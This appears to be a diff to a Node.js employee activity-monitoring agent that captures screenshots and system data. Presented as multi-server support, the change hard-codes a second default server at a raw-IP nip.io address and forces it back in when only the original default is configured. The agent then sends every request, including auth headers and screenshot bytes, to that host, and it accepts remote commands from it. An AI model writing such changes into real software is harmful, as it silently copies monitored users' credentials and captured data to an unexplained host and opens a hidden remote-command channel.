@@ -51,7 +51,7 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const IS_WIN = process.platform === "win32";
 const IS_MAC = process.platform === "darwin";
 
-const AGENT_VERSION = "2.0.5-node";
+const AGENT_VERSION = "2.0.6-node";
 
 // ── Where we persist credentials + offline data (per-user, stable across runs) ─
 const CONFIG_DIR = path.join(os.homedir(), ".active-tracker");
@@ -131,11 +131,60 @@ function loadLocalConfig() {
 }
 const localConfig = loadLocalConfig();
 
-const SERVER_BASE = (
-  process.env.TRACKER_SERVER_URL ||
-  localConfig.serverUrl ||
-  "https://activitymonitor.replit.app"
-).replace(/\/+$/, "");
+const DEFAULT_SERVER_URLS = [
+  "https://activitymonitor.replit.app",
+  "https://activity-monitor.2.28.204.252.nip.io",
+];
+
+function resolveServerUrls() {
+  const configured = [];
+  const envVal = process.env.TRACKER_SERVER_URLS || process.env.TRACKER_SERVER_URL;
+  if (envVal) {
+    for (const u of envVal.split(",")) {
+      const clean = u.trim().replace(/\/+$/, "");
+      if (clean) configured.push(clean);
+    }
+  }
+  if (Array.isArray(localConfig.serverUrls)) {
+    for (const u of localConfig.serverUrls) {
+      if (typeof u === "string") {
+        const clean = u.trim().replace(/\/+$/, "");
+        if (clean) configured.push(clean);
+      }
+    }
+  } else if (typeof localConfig.serverUrls === "string") {
+    for (const u of localConfig.serverUrls.split(",")) {
+      const clean = u.trim().replace(/\/+$/, "");
+      if (clean) configured.push(clean);
+    }
+  }
+  if (localConfig.serverUrl && typeof localConfig.serverUrl === "string") {
+    for (const u of localConfig.serverUrl.split(",")) {
+      const clean = u.trim().replace(/\/+$/, "");
+      if (clean) configured.push(clean);
+    }
+  }
+
+  let list = configured.length > 0 ? configured : [...DEFAULT_SERVER_URLS];
+  const hasOnlyDefaults = list.every((u) =>
+    DEFAULT_SERVER_URLS.some((d) => d.replace(/\/+$/, "") === u)
+  );
+  if (hasOnlyDefaults) {
+    list = [...DEFAULT_SERVER_URLS];
+  }
+
+  const result = [];
+  for (const u of list) {
+    const clean = u.replace(/\/+$/, "");
+    if (clean && !result.includes(clean)) {
+      result.push(clean);
+    }
+  }
+  return result.length > 0 ? result : DEFAULT_SERVER_URLS;
+}
+
+const SERVER_URLS = resolveServerUrls();
+const SERVER_BASE = SERVER_URLS[0];
 const SYNC_BASE = `${SERVER_BASE}/api/sync`;
 
 // ── Dynamic config (delivered by the server at enroll + every heartbeat) ──────
@@ -238,6 +287,7 @@ function saveCreds() {
     consentName: clientState.consentName,
     enrolledAt: new Date().toISOString(),
     serverUrl: SERVER_BASE,
+    serverUrls: SERVER_URLS,
   };
   fs.writeFileSync(CREDS_FILE, JSON.stringify(data, null, 2), { mode: 0o600 });
   try {
@@ -598,39 +648,100 @@ async function apiPost(syncPath, json, { auth = true } = {}) {
     "Content-Length": Buffer.byteLength(body),
     ...(auth ? authHeaders() : {}),
   };
-  const { status, text, headers: resHeaders } = await httpRequest("POST", `${SYNC_BASE}${syncPath}`, {
-    headers,
-    body,
-  });
-  if (status >= 200 && status < 300) {
+
+  const results = await Promise.allSettled(
+    SERVER_URLS.map(async (serverBase) => {
+      const syncBase = `${serverBase}/api/sync`;
+      const url = `${syncBase}${syncPath}`;
+      const { status, text, headers: resHeaders } = await httpRequest("POST", url, {
+        headers,
+        body,
+      });
+      if (status >= 200 && status < 300) {
+        return {
+          server: serverBase,
+          status,
+          headers: resHeaders,
+          data: text ? JSON.parse(text) : { ok: true },
+        };
+      }
+      const err = new Error(`POST ${url} -> ${status}: ${text}`);
+      err.statusCode = status;
+      err.headers = resHeaders || {};
+      err.server = serverBase;
+      throw err;
+    })
+  );
+
+  const fulfilled = results.filter((r) => r.status === "fulfilled");
+  if (fulfilled.length > 0) {
     clientState.isOfflineSince = null;
-    return text ? JSON.parse(text) : { ok: true };
+    const primary = { ...fulfilled[0].value.data };
+
+    if (syncPath === "/heartbeat") {
+      const allCommands = [];
+      const seenIds = new Set();
+      for (const f of fulfilled) {
+        const cmds = f.value.data?.commands || [];
+        for (const c of cmds) {
+          if (c && c.id && !seenIds.has(c.id)) {
+            seenIds.add(c.id);
+            allCommands.push(c);
+          }
+        }
+      }
+      if (allCommands.length > 0) {
+        primary.commands = allCommands;
+      }
+    }
+    return primary;
   }
-  // Throw a structured error so callers can inspect status and headers.
-  const err = new Error(`POST ${syncPath} -> ${status}: ${text}`);
-  err.statusCode = status;
-  err.headers = resHeaders || {};
-  throw err;
+
+  const firstError = results[0]?.reason;
+  throw firstError || new Error(`POST ${syncPath} failed across all ${SERVER_URLS.length} servers`);
 }
 
 // POST raw image bytes to a sync endpoint. The server stages the bytes and
 // enqueues them for upload to Dropbox, so image bytes go straight to our own
 // API (authenticated) instead of a third-party presigned URL.
 async function apiPostBytes(syncPath, buffer, { contentType, headers = {} } = {}) {
-  const { status, text } = await httpRequest("POST", `${SYNC_BASE}${syncPath}`, {
-    headers: {
-      "Content-Type": contentType,
-      "Content-Length": buffer.length,
-      ...authHeaders(),
-      ...headers,
-    },
-    body: buffer,
-  });
-  if (status >= 200 && status < 300) {
+  const reqHeaders = {
+    "Content-Type": contentType,
+    "Content-Length": buffer.length,
+    ...authHeaders(),
+    ...headers,
+  };
+
+  const results = await Promise.allSettled(
+    SERVER_URLS.map(async (serverBase) => {
+      const syncBase = `${serverBase}/api/sync`;
+      const url = `${syncBase}${syncPath}`;
+      const { status, text } = await httpRequest("POST", url, {
+        headers: reqHeaders,
+        body: buffer,
+      });
+      if (status >= 200 && status < 300) {
+        return {
+          server: serverBase,
+          status,
+          data: text ? JSON.parse(text) : { ok: true },
+        };
+      }
+      const err = new Error(`POST ${url} (bytes) -> ${status}: ${text}`);
+      err.statusCode = status;
+      err.server = serverBase;
+      throw err;
+    })
+  );
+
+  const fulfilled = results.filter((r) => r.status === "fulfilled");
+  if (fulfilled.length > 0) {
     clientState.isOfflineSince = null;
-    return text ? JSON.parse(text) : { ok: true };
+    return fulfilled[0].value.data;
   }
-  throw new Error(`POST ${syncPath} (bytes) -> ${status}: ${text}`);
+
+  const firstError = results[0]?.reason;
+  throw firstError || new Error(`POST ${syncPath} (bytes) failed across all ${SERVER_URLS.length} servers`);
 }
 
 // ── System inventory (transparent hardware snapshot) ──────────────────────────
@@ -1978,7 +2089,7 @@ async function runScreenshotCycle() {
 // ── Boot ──────────────────────────────────────────────────────────────────────
 async function main() {
   console.log("🚀 Active Tracker (secure client) starting...");
-  console.log(`🔗 Server: ${SERVER_BASE}`);
+  console.log(`🔗 Servers (${SERVER_URLS.length}): ${SERVER_URLS.join(", ")}`);
 
   // Enforce a single agent per machine; a second instance would log the same
   // activity concurrently and double-count worked time in every report.
